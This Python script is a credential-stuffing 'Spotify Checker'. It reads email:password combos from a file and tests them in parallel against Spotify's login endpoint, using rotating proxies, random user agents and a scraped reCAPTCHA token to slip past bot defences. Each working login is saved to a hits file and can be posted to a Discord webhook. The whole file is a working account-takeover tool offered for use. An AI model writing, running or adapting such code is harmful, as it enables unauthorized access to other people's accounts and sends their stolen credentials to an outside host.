from colorama import init,Fore,Style
from os import name,system
from sys import stdout
from random import choice
from threading import Thread,Lock,active_count,Timer
from time import sleep
from datetime import datetime
from urllib3 import disable_warnings
import requests
import json

class Main:
    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title:str):
        if name == 'posix':
            stdout.write(f"\x1b]2;{title}\x07")
        elif name in ('ce', 'nt', 'dos'):
            system(f'title {title}')
        else:
            stdout.write(f"\x1b]2;{title}\x07")

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def ReadFile(self,filename,method):
        with open(filename,method,encoding='utf8') as f:
            content = [line.strip('\n') for line in f]
            return content

    def ReadJson(self,filename,method):
        with open(filename,method) as f:
            return json.load(f)

    def GetRandomUserAgent(self):
        useragents = self.ReadFile('[Data]/useragents.txt','r')
        return choice(useragents)

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
        proxies = {}
        if self.use_proxy == 1:
            if self.proxy_type == 1:
                proxies = {
                    "http":"http://{0}".format(choice(proxies_file)),
                    "https":"https://{0}".format(choice(proxies_file))
                }
            elif self.proxy_type == 2:
                proxies = {
                    "http":"socks4://{0}".format(choice(proxies_file)),
                    "https":"socks4://{0}".format(choice(proxies_file))
                }
            else:
                proxies = {
                    "http":"socks5://{0}".format(choice(proxies_file)),
                    "https":"socks5://{0}".format(choice(proxies_file))
                }
        else:
            proxies = {
                    "http":None,
                    "https":None
            }
        return proxies

    def CalculateCpm(self):
        self.cpm = self.maxcpm * 60
        self.maxcpm = 0
        Timer(1.0, self.CalculateCpm).start()

    def TitleUpdate(self):
        while True:
            self.SetTitle(f'[One Man Builds Spotify Checker Tool] ^| HITS: {self.hits} ^| BADS: {self.bads} ^| CPM: {self.cpm} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| RETRIES: {self.retries} ^| THREADS: {active_count()-1}')
            sleep(0.1)

    def __init__(self):
        init(convert=True)
        self.SetTitle('[One Man Builds Spotify Checker Tool]')
        self.clear()
        self.title = Style.BRIGHT+Fore.GREEN+"""                                        
                                  ╔══════════════════════════════════════════════════╗    
                                       ╔═╗╔═╗╔═╗╔╦╗╦╔═╗╦ ╦  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                       ╚═╗╠═╝║ ║ ║ ║╠╣ ╚╦╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                       ╚═╝╩  ╚═╝ ╩ ╩╚   ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                  ╚══════════════════════════════════════════════════╝

                
        """
        print(self.title)
        self.hits = 0
        self.bads = 0
        self.retries = 0
        self.webhook_retries = 0
        self.cpm = 0
        self.maxcpm = 0
        self.lock = Lock()
        self.session = requests.Session()
        disable_warnings()

        config = self.ReadJson('[Data]/configs.json','r')

        self.use_proxy = config['use_proxy']
        self.proxy_type = config['proxy_type']
        self.threads_num = config['threads']
        self.webhook_enable = config['webhook_enable']
        self.webhook_url = config['webhook_url']

        print('')

    def find_string_between(self,string,first, last ):
        try:
            start = string.index( first ) + len( first )
            end = string.index( last, start )
            return string[start:end]
        except:
            pass

    def SendWebhook(self,title,message,icon_url,thumbnail_url,proxy,useragent):
        try:
            timestamp = str(datetime.utcnow())

            message_to_send = {"embeds": [{"title": title,"description": message,"color": 65362,"author": {"name": "AUTHOR'S DISCORD SERVER [CLICK HERE]","url": "https://discord.gg/9bHfzyCjPQ","icon_url": icon_url},"footer": {"text": "MADE BY ONEMANBUILDS","icon_url": icon_url},"thumbnail": {"url": thumbnail_url},"timestamp": timestamp}]}
            
            headers = {
                'User-Agent':useragent,
                'Pragma':'no-cache',
                'Accept':'*/*',
                'Content-Type':'application/json'
            }

            payload = json.dumps(message_to_send)

            response = self.session.post(self.webhook_url,data=payload,headers=headers,proxies=proxy)

            if response.text == "":
                pass
            elif "You are being rate limited." in response.text:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
            else:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
        except:
            self.webhook_retries += 1
            self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)

    def Spotify(self,email,password):
        try:
            useragent = self.GetRandomUserAgent()

            proxy = self.GetRandomProxy()

            session = requests.Session()

            recaptcha_headers = {
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding':'gzip, deflate, br',
                'Accept-Language':'en-US,en;q=0.9,fa;q=0.8',
                'Pra':'no-cache',
                'set-fetch-dest':'document',
                'sec-fetch-mode':'navigate',
                'sec-fetch-site':'same-origin'
            }

            recaptcha_link = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p'

                
            response = session.get(recaptcha_link,headers=recaptcha_headers,proxies=proxy)
            recaptcha_token = self.find_string_between(response.text,'<input type="hidden" id="recaptcha-token" value="','">')
            google_nid_headers = {
                'accept':'*/*',
                'accept-encoding':'gzip, deflate, br',
                'accept-language':'en-US,en;q=0.9,fa;q=0.8',
                'Pragma': 'no-cache',
                'origin': 'https://www.google.com',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': useragent
            }
            response = session.post(f'https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c={recaptcha_token}', headers=google_nid_headers,proxies=proxy)
            rresp = response.text.split('"')[3]
            nid = response.cookies['NID']

            grab_headers ={
                'User-Agent': useragent,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'cookie': f'NID= {nid}'
            }

            response = session.get('https://accounts.spotify.com/en/login',headers=grab_headers,proxies=proxy,verify=False,timeout=2)
            csrf = response.cookies['csrf_token']
            devid = response.cookies['__Host-device_id']
            tpa = response.cookies['__Secure-TPASESSION']

            body = f"remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username={email}&password={password}&recaptchaToken={rresp}&csrf_token={csrf}"
                    
            check_headers = {
                'Content-type':'application/x-www-form-urlencoded',
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
                'origin': 'https://accounts.spotify.com',
                'referer': 'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': useragent,
                'cookie': f'sp_t=576b5e3d-a565-47d4-94ce-0b6748fdc625; _gcl_au=1.1.1585241231.1587921490; sp_adid=fbe3a5fc-d8a3-4bc5-b079-3b1663ce0b49; _scid=5eee3e0e-f16b-4f4c-bf73-188861f9fb0c; _hjid=fb8648d2-549b-44c8-93e9-5bf00116b906; _fbp=fb.1.1587921496365.773542932; __Host-device_id={devid}; cookieNotice=true; sp_m=us; spot=%7B%22t%22%3A1596548261%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D; sp_last_utm=%7B%22utm_campaign%22%3A%22alwayson_eu_uk_performancemarketing_core_brand%2Bcontextual-desktop%2Btext%2Bexact%2Buk-en%2Bgoogle%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_source%22%3A%22uk-en_brand_contextual-desktop_text%22%7D; _gcl_dc=GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; _gcl_aw=GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; _gac_UA-5784146-31=1.1596996518.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; ki_t=1597938645946%3B1599140931855%3B1599140931855%3B3%3B3; ki_r=; optimizelyEndUserId=oeu1599636139883r0.3283057902318758; optimizelySegments=%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22gc%22%7D; optimizelyBuckets=%7B%7D; sp_landingref=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.2046705606.1599636143; _sctr=1|1599634800000; sp_usid=ceb6c24c-d1b4-4895-bcb7-e4e386afd063; sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; _pin_unauth=dWlkPVlUQXdaV0UyTXprdE1EQmxOaTAwWlRCbUxUbGtNVGN0T0RVeE1ERTVNalEwTnpBMSZycD1abUZzYzJV; __Secure-TPASESSION={tpa}; __bon=MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=; remember={email}; OptanonAlertBoxClosed=2020-09-09T18: 37:10.735Z; OptanonConsent=isIABGlobal=false&datestamp=Wed+Sep+09+2020+11%3A37%3A11+GMT-0700+(Pacific+Daylight+Time)&version=6.5.0&hosts=&consentId=89714584-b320-4c03-bd3c-be011bfaba6d&interactionCount=1&landingPath=NotLandingPage&groups=t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1&AwaitingReconsent=false&geolocation=US%3BNJ; csrf_token={csrf}; _ga_S35RN5WNT2=GS1.1.1599675929.1.1.1599676676.0; _ga=GA1.2.1572440783.1597938634; _gat=1'
            }

            response = session.post('https://accounts.spotify.com/login/password',headers=check_headers ,data=body,proxies=proxy,verify=False,timeout=2)
            
            self.maxcpm += 1

            if 'errorInvalidCredentials' in response.text:
                self.bads += 1
                self.PrintText(Fore.WHITE,Fore.RED,'BAD',f'{email}:{password}')
                with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
                    f.write(f'{email}:{password}\n')
            elif '"result":"ok"' in response.text:
                self.hits += 1
                self.PrintText(Fore.WHITE,Fore.GREEN,'HIT',f'{email}:{password}')
                with open('[Data]/[Results]/hits.txt','a',encoding='utf8') as f:
                    f.write(f'{email}:{password}\n')
                if self.webhook_enable == 1:
                    self.SendWebhook('Spotify Checker',f'{email}:{password}','https://cdn.discordapp.com/attachments/776819723731206164/796935218166497352/onemanbuilds_new_logo_final.png','https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/768px-Spotify_logo_without_text.svg.png',proxy,useragent)
            else:
                self.retries += 1
                self.Spotify(email,password)
        except:
            self.retries += 1
            self.Spotify(email,password)

    def Start(self):
        Thread(target=self.TitleUpdate).start()
        self.CalculateCpm()
        combos = self.ReadFile('[Data]/combos.txt','r')
        for combo in combos:
            Run = True
            email = combo.split(':')[0]
            password = combo.split(':')[1]

            while Run:
                if active_count()<=self.threads_num:
                    Thread(target=self.Spotify,args=(email,password)).start()
                    Run = False

if __name__ == '__main__':
    main = Main()
    main.Start()